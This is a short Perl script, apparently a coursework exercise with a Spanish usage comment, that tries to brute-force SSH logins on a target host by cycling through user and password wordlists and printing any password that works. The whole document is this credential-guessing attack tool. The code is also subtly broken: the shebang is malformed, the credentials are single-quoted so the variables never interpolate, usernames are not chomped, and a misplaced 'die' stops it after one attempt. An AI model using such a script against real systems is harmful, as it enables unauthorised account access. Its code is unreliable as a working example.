#!/bin/sh/perl
#Modo de uso: perl p8_lceron.pl user_list password_list host

use Net::SSH::Expect;

my $user_list = $ARGV[0];
my $password_list = $ARGV[1];
my $host = $ARGV[2];
my $ssh;

open(WORDLIST, "$password_list")
        or die "[!] Failed to open: $password_list";
open(USERLIST, "$user_list")
        or die "[!] Failed to open: $user_list";        

@plist=<WORDLIST>;
@ulist=<USERLIST>;

foreach $username (@ulist)
{
	foreach $password (@plist) {
		chomp($password);
        print "[*]Trying $password \n";
       
        my $ssh = Net::SSH::Expect -> new (
        host => "$host",
        password => '$password',
        user => '$username',
        raw_pty => 1
        );

        if($ssh -> login())
        {
                print "[*]$password is the password to $host.";
                $ssh -> close();
                die;
        }

	die "[!] Password was not found.";
	}
}
